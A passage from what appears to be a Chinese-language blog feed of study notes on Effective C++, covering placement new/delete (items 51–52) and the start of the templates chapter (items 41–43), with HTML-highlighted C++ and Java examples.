data-toggle="collapse" data-target="#collapse-0sbb6jlmyiaxgh"></i><span>cpp</span><div class="collapse show" id="collapse-0sbb6jlmyiaxgh"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> Base::<span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-type">void</span>* rawMemory, std::<span class="hljs-type">size_t</span> size)</span> <span class="hljs-keyword">noexcept</span> </span>{    <span class="hljs-keyword">if</span> (rawMemory == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span>;    <span class="hljs-keyword">if</span> (size != <span class="hljs-built_in">sizeof</span>(Base)) {        ::<span class="hljs-function"><span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(rawMemory)</span></span>;    <span class="hljs-comment">// 转交给标准的 operator delete 进行处理</span>        <span class="hljs-keyword">return</span>;    }    <span class="hljs-comment">// 归还 rawMemory 所指的内存</span>}</code></pre></div></div><p><strong>如果即将被删除的对象派生自某个基类而后者缺少虚析构函数，那么C++传给<code>operator delete</code>的<code>size</code>大小可能不正确</strong>，这或许是“为多态基类声明虚析构函数”的一个足够的理由，能作为对条款7 的补充。</p><h3 id="条款-52写了-placement-new-也要写-placement-delete">条款 52：写了placement new 也要写 placement delete</h3><blockquote></blockquote><p>placement new最初的含义指的是“<strong>接受一个指针指向对象该被构造之处</strong>”的<code>operator new</code>版本，它在标准库中的用途广泛，其中之一是负责在vector 的未使用空间上创建对象，它的声明如下：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-fofdeklmyiaxgh"></i><span>cpp</span><div class="collapse show" id="collapse-fofdeklmyiaxgh"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(std::<span class="hljs-type">size_t</span>, <span class="hljs-type">void</span>* pMemory)</span> <span class="hljs-keyword">noexcept</span></span>;</code></pre></div></div><p>我们此处要讨论的是广义上的 placementnew，即<strong>带有附加参数的<code>operator new</code></strong>，都叫placementnew。例如下面这种：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-1sror5lmyiaxgh"></i><span>cpp</span><div class="collapse show" id="collapse-1sror5lmyiaxgh"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(std::<span class="hljs-type">size_t</span>, std::ostream&amp; logStream)</span></span>;<span class="hljs-keyword">auto</span> pw = <span class="hljs-built_in">new</span> (std::cerr) Widget;</code></pre></div></div><p>当我们在使用 new表达式创建对象时，共有两个函数被调用：一个是用以分配内存的<code>operator new</code>，一个是对象的构造函数。假设第一个函数调用成功，而第二个函数却抛出异常，那么会由C++ runtime 调用<code>operator delete</code>，归还已经分配好的内存。</p><blockquote><p>如：<code>Widget* pw new Widget;</code>共有两个函数被调用：一个是用以分配内存的operatornew，一个是Widget的 default构造函数。</p></blockquote><p>这一切的前提是 C++ runtime能够找到<code>operator new</code>对应的<code>operator delete</code>。</p><p>如果我们使用的是自定义的 placement new，而没有为其准备对应的placement delete 的话，就无法避免发生内存泄漏。</p><p>在下面的情景下我们希望在动态创建一个Widget时将相关的分配信息志记(Iogs)于cerr：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-lp070glmyiaxgh"></i><span>cpp</span><div class="collapse show" id="collapse-lp070glmyiaxgh"><pre><code class="hljs cpp">Widget *pw=<span class="hljs-built_in">new</span> (std:cerr) Widget;</code></pre></div></div><p>因此，合格的代码应该是这样的：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-xx3v0almyiaxgh"></i><span>cpp</span><div class="collapse show" id="collapse-xx3v0almyiaxgh"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Widget</span> {<span class="hljs-keyword">public</span>:    <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(std::<span class="hljs-type">size_t</span> size, std::ostream&amp; logStream)</span></span>;   <span class="hljs-comment">// placement new</span>    <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-type">void</span>* pMemory)</span></span>;                             <span class="hljs-comment">// delete 时调用的正常 operator delete</span>    <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-type">void</span>* pMemory, std::ostream&amp; logStream)</span></span>;    <span class="hljs-comment">// placement delete，需要配套提供</span>};</code></pre></div></div><p>另一个要注意的问题是，由于成员函数的名称会掩盖其外部作用域中的相同名称（见条款33），所以单纯提供 placement new会导致无法使用正常版本的<code>operator new</code>：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-loo446lmyiaxgh"></i><span>cpp</span><div class="collapse show" id="collapse-loo446lmyiaxgh"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base</span> {<span class="hljs-keyword">public</span>:    <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(std::<span class="hljs-type">size_t</span> size, std::ostream&amp; logStream)</span></span>;    ...};<span class="hljs-keyword">auto</span> pb = <span class="hljs-keyword">new</span> Base;             <span class="hljs-comment">// 无法通过编译！因为正常形式的operator new被掩盖。</span><span class="hljs-keyword">auto</span> pb = <span class="hljs-built_in">new</span> (std::cerr) Base; <span class="hljs-comment">// 正确</span></code></pre></div></div><p>同样道理，派生类中的<code>operator new</code>会掩盖全局版本和继承而得的<code>operator new</code>版本：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-yxvi6qlmyiaxgh"></i><span>cpp</span><div class="collapse show" id="collapse-yxvi6qlmyiaxgh"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Derived</span> : <span class="hljs-keyword">public</span> Base {<span class="hljs-keyword">public</span>:    <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(std::<span class="hljs-type">size_t</span> size)</span></span>; <span class="hljs-comment">//重新声明正常形式的new</span>    ...};<span class="hljs-keyword">auto</span> pd = <span class="hljs-built_in">new</span> (std::clog) Derived;  <span class="hljs-comment">// 无法通过编译！因为Base的 placement new被掩盖了.</span><span class="hljs-keyword">auto</span> pd = <span class="hljs-keyword">new</span> Derived;              <span class="hljs-comment">// 正确</span></code></pre></div></div><p>为了避免名称遮掩问题，需要确保以下形式的<code>operator new</code>对于定制类型仍然可用（这些是C++标准程序库默认提供的），除非你的意图就是阻止客户使用它们：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ryea09lmyiaxgh"></i><span>cpp</span><div class="collapse show" id="collapse-ryea09lmyiaxgh"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span>* <span class="hljs-title">operator</span><span class="hljs-params">(std::<span class="hljs-type">size_t</span>)</span> <span class="hljs-title">throw</span><span class="hljs-params">(std::bad_alloc)</span></span>;           <span class="hljs-comment">// normal new</span><span class="hljs-function"><span class="hljs-type">void</span>* <span class="hljs-title">operator</span><span class="hljs-params">(std::<span class="hljs-type">size_t</span>, <span class="hljs-type">void</span>*)</span> <span class="hljs-keyword">noexcept</span></span>;                 <span class="hljs-comment">// placement new</span><span class="hljs-function"><span class="hljs-type">void</span>* <span class="hljs-title">operator</span><span class="hljs-params">(std::<span class="hljs-type">size_t</span>, <span class="hljs-type">const</span> std::<span class="hljs-type">nothrow_t</span>&amp;)</span> <span class="hljs-keyword">noexcept</span></span>; <span class="hljs-comment">// nothrow new</span></code></pre></div></div><blockquote><p>这一部分的逻辑和类的构造函数类似。</p></blockquote><p>一个最简单的实现方式是，准备一个基类，内含所有正常形式的 new 和delete：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-1dafw3lmyiaxgh"></i><span>cpp</span><div class="collapse show" id="collapse-1dafw3lmyiaxgh"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">StadardNewDeleteForms</span>{<span class="hljs-keyword">public</span>:    <span class="hljs-comment">// normal new/delete</span>    <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(std::<span class="hljs-type">size_t</span> size)</span></span>{        <span class="hljs-keyword">return</span> ::<span class="hljs-keyword">operator</span> <span class="hljs-built_in">new</span>(size);    }    <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-type">void</span>* pMemory)</span> <span class="hljs-keyword">noexcept</span> </span>{        ::<span class="hljs-function"><span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(pMemory)</span></span>;    }    <span class="hljs-comment">// placement new/delete</span>    <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(std::<span class="hljs-type">size_t</span> size, <span class="hljs-type">void</span>* ptr)</span> </span>{        <span class="hljs-keyword">return</span> ::<span class="hljs-keyword">operator</span> <span class="hljs-built_in">new</span>(size, ptr);    }    <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-type">void</span>* pMemory, <span class="hljs-type">void</span>* ptr)</span> <span class="hljs-keyword">noexcept</span> </span>{        ::<span class="hljs-function"><span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(pMemory, ptr)</span></span>;    }    <span class="hljs-comment">// nothrow new/delete</span>    <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(std::<span class="hljs-type">size_t</span> size, <span class="hljs-type">const</span> std::<span class="hljs-type">nothrow_t</span>&amp; nt)</span> </span>{        <span class="hljs-keyword">return</span> ::<span class="hljs-keyword">operator</span> <span class="hljs-built_in">new</span>(size,nt);    }    <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-type">void</span>* pMemory,<span class="hljs-type">const</span> std::<span class="hljs-type">nothrow_t</span>&amp;)</span> <span class="hljs-keyword">noexcept</span> </span>{        ::<span class="hljs-function"><span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(pMemory)</span></span>;    }};</code></pre></div></div><p>凡是想以自定义形式扩充标准形式的客户，可以利用继承和<code>using</code>声明式（见条款33）取得标准形式：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-9fbo3xlmyiaxgh"></i><span>cpp</span><div class="collapse show" id="collapse-9fbo3xlmyiaxgh"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Widget</span>: <span class="hljs-keyword">public</span> StandardNewDeleteForms{<span class="hljs-keyword">public</span>:    <span class="hljs-keyword">using</span> StandardNewDeleteForms::<span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span>;    <span class="hljs-keyword">using</span> StandardNewDeleteForms::<span class="hljs-keyword">operator</span> <span class="hljs-keyword">delete</span>;    <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(std::<span class="hljs-type">size_t</span> size, std::ostream&amp; logStream)</span></span>;    <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-keyword">operator</span> <span class="hljs-title">detele</span><span class="hljs-params">(std::<span class="hljs-type">size_t</span> size, std::ostream&amp; logStream)</span> <span class="hljs-keyword">noexcept</span></span>;    ...};</code></pre></div></div>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>EffectiveC++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Effective C++ - Item41-47 - 模版与泛型编程</title>
    <link href="/posts/4565/"/>
    <url>/posts/4565/</url>
    
    <content type="html"><![CDATA[<h1 id="effective-c---item41-47---模版与泛型编程">Effective C++ -Item41-47 - 模版与泛型编程</h1><h3 id="总览">总览</h3><p>这一模块的内容是在完整阅读《Effective C++》的基础上，参考了<a href="https://www.zhihu.com/people/96-61-29-67">缪之灵</a>大佬的<a href="https://zhuanlan.zhihu.com/p/613356779">一篇文章学完 EffectiveC++：条款 &amp; 实践</a>进行总结。虽然<a href="https://www.zhihu.com/people/96-61-29-67">缪之灵</a>大佬的文章将最重要的部分总结的非常到位，但在此结合自己的理解和编程实践对其进行补充，并订正一些错误，以方便自己后续总结回顾，同时在尽可能保持简洁的前提下提高可读性。虽然原书有些地方写的比较拖沓，但作为经典的C++参考书，想要了解更多的细节，还是值得仔细去阅读的。</p><p>同时，假定阅读文章时对C++已经具有本科高级语言程序设计课程内容的理解水平。大部分情况下，除非它很重要，不会对C++基础的语法特性进行介绍。</p><p>本部分是第七章内容，对<strong>条款41-47</strong>进行介绍。</p><p>或许前面的内容只是对早已熟悉的内容进行的强调，而这一部分内容在学校的课程中难以涉及，内容也较为晦涩。</p><p>但模版和泛型编程不仅在适当的时候能减少代码的冗余，而且还是STL(StandardTemplateLibrary)和Boost的基石，为C++保持运行效率的同时提高易用性作出了巨大贡献。掌握这一部分内容，至少可以称得上是“比较好”的template程序员，对C++的认识也能更进一步。</p><h3 id="条款-41了解隐式接口和编译期多态">条款41：了解隐式接口和编译期多态</h3><blockquote><p>泛型编程本身的核心思想是<strong>编写可以在不同数据类型上工作的通用代码</strong>。但C++的模版不局限于此。</p></blockquote><p>类与模板都支持接口和多态。</p><p>对于类而言接口是显式的，以函数签名为中心，多态则是通过虚函数发生于运行期；</p><p>而对模板参数而言，接口是隐式的，奠基于有效表达式，多态则是通过<strong>模板具现化和函数重载解析（functionoverloading resolution）</strong>，发生于编译期。</p><p>考虑以下例子：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-w8fug9lmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-w8fug9lmso36dk"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;</span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">DoProcessing</span><span class="hljs-params">(T&amp; w)</span> </span>{    <span class="hljs-keyword">if</span> (w.<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">10</span> &amp;&amp; w != someNastyWidget) {    ...</code></pre></div></div><p>以上代码中，<code>T</code>类型的隐式接口要求：</p><ol type="1"><li>提供一个名为<code>size</code>的成员函数，该函数的返回值可与<code>int</code>（10的类型）执行<code>operator&gt;</code>，或<strong>经过隐式转换后可执行<code>operator&gt;</code></strong>。</li><li>必须支持一个<code>operator!=</code>函数，接受<code>T</code>类型和<code>someNastyWidget</code>的类型，或其隐式转换后得到的类型。</li></ol><blockquote><p>同样的道理，<code>operator&amp;&amp;</code>也可被重载。即所谓的函数重载解析。</p></blockquote><p>加诸于模板参数身上的隐式接口，就像加诸于类对象身上的显式接口“一样真实”，两者都在编译期完成检查，你无法在模板中使用“不支持模板所要求之隐式接口”的对象（代码无法通过编译）。</p><blockquote><p>相比C++，Java实现泛型的原理和C++<a href="https://nirvana1997.github.io/c-%E6%B3%9B%E5%9E%8B%E5%92%8Cjava%E6%B3%9B%E5%9E%8B%E7%9A%84%E5%AE%9E%E7%8E%B0/">大有不同</a>。</p><p>Java在编译时，它会去执行类型检查和类型推断，然后生成普通的不带泛型的字节码，这种字节码可以被一般的Java 虚拟机接收并执行，这种技术被称为擦除 (erasure)。</p><p>Java编译后不同类型的模板类编译出的是同一份代码。然后在使用时编译器会帮助进行类型转换。</p><p>这么做是为了保持与Java早期版本的向后兼容性。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-uq9sl5lmso36dk"></i><span>java</span><div class="collapse show" id="collapse-uq9sl5lmso36dk"><pre><code class="hljs java">Pair&lt;String&gt; pair = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Pair</span>&lt;&gt;(<span class="hljs-string">""</span>, <span class="hljs-string">""</span>);    pair.setFirst(<span class="hljs-string">"Generic"</span>);    pair.setSecond(<span class="hljs-string">"Programming"</span>);    <span class="hljs-type">String</span> <span class="hljs-variable">first</span> <span class="hljs-operator">=</span> pair.getFirst();    <span class="hljs-type">String</span> <span class="hljs-variable">second</span> <span class="hljs-operator">=</span> pair.getSecond();</code></pre></div></div><p>反编译后为:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-313tillmso36dk"></i><span>Java</span><div class="collapse show" id="collapse-313tillmso36dk"><pre><code class="hljs Java"><span class="hljs-type">Pair</span> <span class="hljs-variable">pair</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Pair</span>(<span class="hljs-string">""</span>, <span class="hljs-string">""</span>);    pair.setFirst(<span class="hljs-string">"Generic"</span>);    pair.setSecond(<span class="hljs-string">"Programming"</span>);    <span class="hljs-type">String</span> <span class="hljs-variable">first</span> <span class="hljs-operator">=</span> (String)pair.getFirst();    <span class="hljs-type">String</span> <span class="hljs-variable">second</span> <span class="hljs-operator">=</span> (String)pair.getSecond();</code></pre></div></div><p>所以 java泛型的实现是在运行时去进行判断和类型转换的，这样会对运行时的效率有一定影响，但编译出来的泛型类的代码只需要一份。</p></blockquote><h3 id="条款-42了解-typename-的双重含义">条款 42：了解 typename的双重含义</h3><p>在模板声明式中，使用<code>class</code>和<code>typename</code>关键字并没有什么不同，但在模板内部，<code>typename</code>拥有更多的一重含义。</p><p>为了方便解释，我们首先需要引入一个模板相关的概念：模板内出现的名称如果相依于某个模板参数，我们称之为<strong>从属名称（dependentnames）</strong>；如果从属名称在类内呈嵌套状，我们称之为<strong>嵌套从属名称（nesteddependentname）</strong>；如果一个名称并不倚赖任何模板参数的名称，我们称之为<strong>非从属名称（non-dependentnames）</strong>。</p><p>考虑以下模板代码：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-8igor8lmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-8igor8lmso36dk"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> C&gt;</span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Print2nd</span><span class="hljs-params">(<span class="hljs-type">const</span> C&amp; container)</span> </span>{    <span class="hljs-comment">//打印容器内的第二元素，注意这不是有效的C++代码</span>    <span class="hljs-keyword">if</span> (container.<span class="hljs-built_in">size</span>() &gt;= <span class="hljs-number">2</span>) {        <span class="hljs-function">C::const_iterator <span class="hljs-title">iter</span><span class="hljs-params">(container.begin())</span></span>;        ++iter;        <span class="hljs-type">int</span> value = *iter;        std::cout &lt;&lt; value;    }}</code></pre></div></div><p>这段代码看起来没有任何问题，但实际编译时却会报错，这一切的罪魁祸首便是<code>C::const_iterator</code>。此处的<code>C::const_iterator</code>是一个指向某类型的<strong>嵌套从属类型名称（nesteddependent type name）</strong>。</p><blockquote><p>看完上面的抽象概念，你可能已经有点头大了，现在咱们来重新理一理：</p><p>template内出现的名称如果相依于某个template参数,称之为<strong>从属名称(dependentnames)</strong>。比如上面的<code>const C&amp; container</code>中的<code>C</code></p><p>如果从属名称在class内呈嵌套状，我们称它为<strong>嵌套从属名称(nesteddependent name)</strong>。<code>C::const iterator</code>就是这样一个名称。</p><p>实际上它是个<strong>嵌套从属类型名称(nested dependent typename)</strong>,也就是个嵌套从属名称并且指涉某类型。</p></blockquote><p>而嵌套从属名称可能会导致解析困难，因为在编译器知道<code>C</code>是什么之前，没有任何办法知道<code>C::const_iterator</code>是否为一个类型，这就导致出现了歧义状态，而C++ <strong>默认假设嵌套从属名称不是类型名称</strong>。</p><blockquote><p>这句话是什么意思呢？对于<code>A::b</code>这种情况，只是说明在命名空间<code>A</code>中有名称<code>b</code>，<code>b</code>可能是个<code>typedef</code>，这种情况就像上面所预想的一样，是嵌套从属类型名称，但也可能是变量名称。这时候如果上面的例子换成这样：<code>C::const_iterator* x;</code>,那如果<code>const_iterator</code>是变量，我们将<code>*</code>理解成乘号便是理所当然的，而且也是<strong>默认的情况</strong>。这就造成了二义性。</p></blockquote><p>这时我们应当显式指明嵌套从属<strong>类型</strong>名称，方法就是将<code>typename</code>关键字作为其前缀词：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-rqtqealmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-rqtqealmso36dk"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">typename</span> C::const_iterator <span class="hljs-title">iter</span><span class="hljs-params">(container.begin())</span></span>;</code></pre></div></div><p>同样地，若嵌套从属名称出现在模板函数声明部分，也需要显式地指明是否为类型名称：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-jn2ifllmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-jn2ifllmso36dk"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> C&gt;</span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Print2nd</span><span class="hljs-params">(<span class="hljs-type">const</span> C&amp; container, <span class="hljs-type">const</span> <span class="hljs-keyword">typename</span> C::iterator iter)</span></span>;</code></pre></div></div><blockquote><p>而且<code>typename</code>只被用来验明嵌套从属类型名称；或者说只是用来打这个补丁。其他名称不该有它存在。比如在<code>const C&amp;</code>前面加<code>typename</code>就是画蛇添足了。</p></blockquote><p>这一规则的例外是，<code>typename</code>不可以出现在基类列表内的嵌套从属类型名称之前，也不可以在成员初始化列表中作为基类的修饰符：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-6ne87glmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-6ne87glmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">Derived</span> : <span class="hljs-keyword">public</span> Base&lt;T&gt;::Nested {    <span class="hljs-comment">// 基类列表中不允许使用 typename</span><span class="hljs-keyword">public</span>:    <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">Derived</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><span class="hljs-function">        : Base&lt;T&gt;::Nested(x) {</span>                 <span class="hljs-comment">// 成员初始化列表中不允许使用 typename</span>        <span class="hljs-keyword">typename</span> Base&lt;T&gt;::Nested temp;        ...    }    ...};</code></pre></div></div><p>捎带提及，在类型名称过于复杂时，可以使用<code>using</code>或<code>typedef</code>来进行简化。下面给出一个应用实例：</p><blockquote><p>假设我们正在撰写一个functiontemplate，它接受一个迭代器，而我们打算为该迭代器指涉的对象做一份local副本temp。我们可以这么写：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-2gxjjalmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-2gxjjalmso36dk"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> IterT&gt;</span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">workWithIterator</span><span class="hljs-params">(IterT iter)</span></span><span class="hljs-function"></span>{<span class="hljs-keyword">typename</span> std::iterator_traits&lt;IterT&gt;::<span class="hljs-function">value_type <span class="hljs-title">temp</span><span class="hljs-params">(*iter)</span></span>;  ...}</code></pre></div></div><p>看着有点复杂。这个语句声明一个local变量(<code>temp</code>)，使用<code>IterT</code>对象所指物的相同类型，并将<code>temp</code>初始化为<code>iter</code>所指物。</p><p><code>std::iterator_traits</code>是一个模版元编程工具，如其名它能获取迭代器类型的特性信息。<code>value_type</code>获取迭代器的值类型。</p><p>比如，如果<code>IterT</code>是<code>vector&lt;int&gt;::iterator</code>，<code>temp</code>的类型就是<code>int</code>。如果<code>IterT</code>是<code>list&lt;string&gt;::iterator</code>，<code>temp</code>的类型就是<code>string</code>。由于<code>std::iterator_traits&lt;IterT&gt;::value_type</code>是个嵌套从属类型名称(<code>value type</code>被嵌套于<code>iterator_traits&lt;IterT&gt;</code>之内而<code>IterT</code>是个<code>template</code>参数)，所以我们必须在它之前放置typename。</p><p>可以这样写：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-tv38h0lmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-tv38h0lmso36dk"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> IterT&gt;</span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">workWithIterator</span><span class="hljs-params">(IterT iter)</span></span><span class="hljs-function"></span>{<span class="hljs-keyword">typedef</span> <span class="hljs-keyword">typename</span> std:iterator_traits&lt;IterT&gt;:<span class="hljs-function">value_type <span class="hljs-title">temp</span><span class="hljs-params">(*iter)</span></span>;  <span class="hljs-comment">// 或using value_type = typename std::iterator_traits&lt;IterT&gt;::value_type;</span>  <span class="hljs-function">value_type <span class="hljs-title">temp</span><span class="hljs-params">(*iter)</span></span>;  ...}</code></pre></div></div></blockquote><h3 id="条款-43学习处理模板化基类内的名称">条款43：学习处理模板化基类内的名称</h3><p>在模板编程中，模板类的继承并不像普通类那么自然。</p><p>考虑以下情形：</p><blockquote><p>有若干公司有发送信息的需求，我们需要写一个<code>MsgSender</code>接口，用来对不同公司的信息进行传送。</p><p></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-wm0epnlmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-wm0epnlmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CompanyA</span>{<span class="hljs-keyword">public</span>:<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">sendcleartext</span> <span class="hljs-params">(<span class="hljs-type">const</span> std::string &amp;msg)</span></span>;<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">sendEncrypted</span> <span class="hljs-params">(<span class="hljs-type">const</span> std::string &amp;msg)</span></span>;}；<span class="hljs-keyword">class</span> <span class="hljs-title class_">CompanyB</span>{<span class="hljs-keyword">public</span>:    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">sendCleartext</span> <span class="hljs-params">(<span class="hljs-type">const</span> std::string&amp;msg)</span></span>;<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">sendEncrypted</span><span class="hljs-params">(<span class="hljs-type">const</span> std:string&amp;msg)</span></span>;}；</code></pre></div></div><p></p><p>如果编译期间我们有足够信息来决定哪一个信息传至哪一家公司，就可以采用基于template的解法：</p><p></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-iac3uilmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-iac3uilmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MsgInfo</span> { ... }; <span class="hljs-comment">//MsgInfo决定我们需要发送的信息</span><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> Company&gt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">MsgSender</span> {<span class="hljs-keyword">public</span>:    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SendClear</span><span class="hljs-params">(<span class="hljs-type">const</span> MsgInfo&amp; info)</span> </span>{      std:string msg；       <span class="hljs-comment">//在这儿，根据info产生信息：</span>Company c;c.<span class="hljs-built_in">sendcleartext</span> (msg);    }    ...};<span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> Company&gt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">LoggingMsgSender</span> : <span class="hljs-keyword">public</span> MsgSender&lt;Company&gt; {<span class="hljs-keyword">public</span>:    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SendClearMsg</span><span class="hljs-params">(<span class="hljs-type">const</span> MsgInfo&amp; info)</span> </span>{      <span class="hljs-comment">//传送前记录一下日志...</span>        <span class="hljs-built_in">SendClear</span>(info);        <span class="hljs-comment">// 调用基类函数，这段代码无法通过编译</span>      <span class="hljs-comment">//传送后记录一下日志...</span>    }    ...};</code></pre></div></div><p></p></blockquote><p>很明显，由于直到模板类被真正实例化之前，编译器并不知道模版派生类所继承的基类（如上例<code>MsgSender&lt;Company&gt;</code>）具体长什么样，有可能它是一个<strong>全特化</strong>的版本。</p><blockquote><p>什么叫全特化？如上例，有一个公司只希望他的信息被加密通信：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" 